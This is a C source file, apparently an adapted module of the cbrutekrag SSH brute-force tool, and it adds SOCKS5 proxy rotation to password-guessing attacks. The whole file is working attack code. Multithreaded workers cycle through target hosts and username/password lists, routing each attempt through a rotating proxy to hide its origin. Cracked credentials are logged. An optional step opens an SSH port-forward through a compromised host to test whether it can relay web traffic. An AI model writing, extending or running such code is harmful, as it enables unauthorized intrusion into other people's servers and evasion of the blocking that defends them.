/*
 adapted bruteforce_proxy_ssh.c - proxy arg variant
 - All functions have _proxy suffix
 - Worker reads proxy from context with:
     btkg_proxy_t *pxy = &proxies->proxies[context->proxies_idx];
 - The worker passes pxy->ip and pxy->port to try/login functions
 - Functions changed:
     int bruteforce_ssh_login_proxy(..., const char *proxy_ip, uint16_t proxy_port)
     int bruteforce_ssh_try_login_proxy(..., const char *proxy_ip, uint16_t proxy_port)
*/

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h> /* close */
#include <stdlib.h>

#include <libssh/libssh.h>
#include <pthread.h>

#include "cbrutekrag.h"
#include "log.h"
#include "proxy.h"

/* Prototypes */


/* Attempt to brute-force SSH login using proxy (proxy ip/port passed explicitly) */
int bruteforce_ssh_login_proxy(btkg_context_t *context, const char *hostname,
			       uint16_t port, const char *username,
			       const char *password,
			       const char *proxy_ip, uint16_t proxy_port)
{
	ssh_session session = NULL;
	int verbosity = 0;
	btkg_options_t *options = &context->options;

	if (options->verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
		verbosity = SSH_LOG_PROTOCOL;
	} else {
		verbosity = SSH_LOG_NOLOG;
	}

	session = ssh_new();
	if (session == NULL) {
		log_error("Cant create SSH session.");
		return -1;
	}

	if (!proxy_ip || proxy_ip[0] == '\0' || proxy_port == 0) {
		log_error("Invalid proxy provided to bruteforce_ssh_login_proxy.");
		ssh_free(session);
		return -1;
	}

	int proxied_fd = -1;
	/* Use proxy helper to establish proxied TCP connection to hostname:port */
	if (btkg_proxy_socks5_connect(context, proxy_ip, proxy_port,
				      hostname, port, &proxied_fd) != 0) {
		log_debug("Failed to connect to %s:%u via proxy %s:%u",
			  hostname, (unsigned)port, proxy_ip,
			  (unsigned)proxy_port);
		ssh_free(session);
		return -1;
	}

	int timeout = options->timeout;
	ssh_options_set(session, SSH_OPTIONS_HOST, hostname);
	ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	ssh_options_set(session, SSH_OPTIONS_PORT, &(int){ port });
	ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
	ssh_options_set(session, SSH_OPTIONS_USER, username);

	/* Provide already-connected socket FD to libssh so it uses the proxied socket */
	ssh_options_set(session, SSH_OPTIONS_FD, &proxied_fd);

	int r = ssh_connect(session);
	if (r != SSH_OK) {
		if (options->verbose & CBRUTEKRAG_VERBOSE_MODE) {
			log_error("[!] Error connecting to %s:%d %s.", hostname,
				  port, ssh_get_error(session));
		}
		if (proxied_fd >= 0) close(proxied_fd);
		ssh_free(session);
		return -1;
	}

	r = ssh_userauth_none(session, NULL);
	if (r == SSH_AUTH_SUCCESS) {
		log_debug("[!] %s:%d - Server without authentication.", hostname, port);
		ssh_disconnect(session);
		ssh_free(session);
		if (proxied_fd >= 0) close(proxied_fd);
		return -1;
	}

	if (r == SSH_AUTH_ERROR) {
		log_debug("[!] %s:%d - ssh_userauth_none(): A serious error happened.", hostname, port);
		ssh_disconnect(session);
		ssh_free(session);
		if (proxied_fd >= 0) close(proxied_fd);
		return -1;
	}

	int method = ssh_userauth_list(session, NULL);

	if (method & (int)SSH_AUTH_METHOD_PASSWORD) {
		r = ssh_userauth_password(session, NULL, password);
		if (r == SSH_AUTH_SUCCESS) {
			/* Credentials accepted */
			if (options->check_http != NULL) {
				ssh_channel channel = ssh_channel_new(session);
				if (channel == NULL) {
					log_error("Error ssh_channel_new: %s", ssh_get_error(session));
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -2;
				}

				log_debug("%s:%d %s %s - Opening tunnel (via proxy)...",
					  hostname, port, username, password);
				r = ssh_channel_open_forward(channel, options->check_http, 80,
							    "localhost", 0);
				if (r != SSH_OK) {
					log_error("Error ssh_channel_open_forward: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -3;
				}

				char buffer[1024];
				int nbytes;
				snprintf(buffer, sizeof(buffer),
					 "GET / HTTP/1.1\r\nHost: %s\r\n\r\n",
					 options->check_http);

				r = ssh_channel_write(channel, buffer, (uint32_t)strlen(buffer));
				if (r == SSH_ERROR) {
					log_error("Error ssh_channel_write: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -4;
				}

				nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
				if (nbytes == 0) {
					log_warn("%s:%d %s %s - http-check empty response", hostname, port, username, password);
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -6;
				}

				if (nbytes < 0) {
					log_error("Error ssh_channel_read: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -5;
				}

				if (channel) {
					ssh_channel_close(channel);
					ssh_channel_free(channel);
				}
			}

			ssh_disconnect(session);
			ssh_free(session);
			if (proxied_fd >= 0) close(proxied_fd);
			return 0;
		}
	}

	ssh_disconnect(session);
	ssh_free(session);
	if (proxied_fd >= 0) close(proxied_fd);
	return -1;
}

/* Wrapper for trying login; passes proxy ip/port */
int bruteforce_ssh_try_login_proxy(btkg_context_t *context, const char *hostname,
				   const uint16_t port, const char *username,
				   const char *password,
				   const char *proxy_ip, uint16_t proxy_port)
{
	const char *_password = strcmp(password, "$TARGET") == 0 ? hostname : password;
	const char *_username = strcmp(username, "$TARGET") == 0 ? hostname : username;

	int ret = bruteforce_ssh_login_proxy(context, hostname, port, _username, _password,
					     proxy_ip, proxy_port);

	if (ret == 0) {
		log_info("\033[32m[+]\033[0m %s:%d %s %s", hostname, port, _username, _password);
		if (context->output != NULL) {
			btkg_log_successfull_login(context->output,
						   context->options.bruteforce_output_format,
						   hostname, port, _username, _password);
		}
	} else {
		log_debug("\033[38m[-]\033[0m %s:%d %s %s", hostname, port, _username, _password);
	}

	return ret;
}

/* Worker function (proxy variant) - now reads proxy entry and passes its ip/port */
static void *btkg_bruteforce_worker_proxy(void *ptr)
{
	btkg_context_t *context = (btkg_context_t *)ptr;
	btkg_target_list_t *targets = &context->targets;
	btkg_credentials_list_t *credentials = &context->credentials;
	btkg_proxy_list_t *proxies = &context->proxies;
	btkg_options_t *options = &context->options;

	for (;;) {
		pthread_mutex_lock(&context->lock);

		/* If we've exhausted targets for the current credential, advance credential and
		   also advance proxy index (wrap-around). Keep these index ops under the lock. */
		if (context->targets_idx >= targets->length) {
			context->targets_idx = 0;
			context->credentials_idx++;

			/* whenever credential index is increased, advance proxy index too */
			if (proxies->count > 0) {
				context->proxies_idx++;
				if (context->proxies_idx >= proxies->count) {
					context->proxies_idx = 0;
				}
			}
		}

		/* If we've exhausted credentials -> stop */
		if (context->credentials_idx >= credentials->length) {
			pthread_mutex_unlock(&context->lock);
			break;
		}

		/* fetch work item (target + credential + proxy) while holding lock */
		btkg_target_t *target = &targets->targets[context->targets_idx++];
		btkg_credentials_t *combo = &credentials->credentials[context->credentials_idx];

		/* read proxy entry at current index (do not modify proxy index here;
		   we've already advanced it above on credential-rollover). This
		   follows your requested pattern:
		     btkg_proxy_t *pxy = &proxies->proxies[context->proxies_idx];
		*/
		btkg_proxy_t *pxy = NULL;
		if (proxies->count > 0) {
			/* defensive check: if index out of range, wrap it */
			if (context->proxies_idx >= proxies->count) {
				context->proxies_idx = 0;
			}
			pxy = &proxies->proxies[context->proxies_idx];
		}

		context->count++;
		pthread_mutex_unlock(&context->lock);

		/* prepare proxy args to pass */
		const char *proxy_ip = NULL;
		uint16_t proxy_port = 0;
		if (pxy) {
			proxy_ip = pxy->ip;
			proxy_port = pxy->port;
		} else {
			/* If no proxy configured, you can decide how to behave. Here we skip attempts. */
			if (!options->dry_run) {
				log_debug("No proxy configured; skipping attempt for %s:%d", target->host, target->port);
				continue;
			}
		}

		if (!options->dry_run) {
			int ret = bruteforce_ssh_try_login_proxy(context,
					target->host, target->port,
					combo->username, combo->password,
					proxy_ip, proxy_port);
			if (ret == 0) {
				pthread_mutex_lock(&context->lock);
				context->successful++;
				pthread_mutex_unlock(&context->lock);
			}
		} else {
			const char *proxy_str = proxy_ip ? proxy_ip : "no-proxy";
			log_debug("\033[38m[-]\033[0m %s:%d %s %s (proxy=%s:%u)",
				  target->host, target->port, combo->username,
				  combo->password, proxy_str, (unsigned)proxy_port);
		}
	}

	return NULL;
}

/* Start brute-force (proxy variant) */
void btkg_bruteforce_start_proxy(btkg_context_t *context)
{
	btkg_options_t *options = &context->options;

	pthread_t scan_threads[options->max_threads];
	int ret;

	for (size_t i = 0; i < options->max_threads; i++) {
		log_debug("Creating thread (proxy): %ld", i);
		if ((ret = pthread_create(&scan_threads[i], NULL,
					  btkg_bruteforce_worker_proxy,
					  (void *)context))) {
			log_error("Thread creation failed: %d\n", ret);
		}
	}

	for (size_t i = 0; i < options->max_threads; i++) {
		ret = pthread_join(scan_threads[i], NULL);
		if (ret != 0) {
			log_error("Cannot join thread no: %d\n", ret);
		}
	}
}
